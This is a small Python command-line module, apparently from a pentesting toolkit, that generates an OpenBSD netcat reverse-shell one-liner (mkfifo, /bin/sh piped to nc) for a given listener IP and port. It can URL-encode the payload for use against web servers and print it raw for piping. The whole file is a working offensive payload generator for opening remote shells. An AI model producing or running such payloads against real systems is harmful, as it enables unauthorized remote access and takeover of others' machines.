import click
from colorama import Fore, Back, Style
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", help="Enable raw output. Useful to pipe commands.", default=False, is_flag=True)
@click.option("-u", "--urlencode", help="Enable urlencode. Sometimes necessary when targeting webservers.", default=False, is_flag=True)
def command(listener_ip, listener_port, raw=False, urlencode=False):
    """Return nc openbsd reverse shell with correct ip and port"""
    constructed_command = f"rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc {listener_ip} {listener_port} >/tmp/f"
    if urlencode:
        constructed_command = quote(constructed_command)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}OpenBSD nc shell:\n\t{Fore.WHITE}{constructed_command}")
    else:
        click.secho(f"{constructed_command}",nl=False)




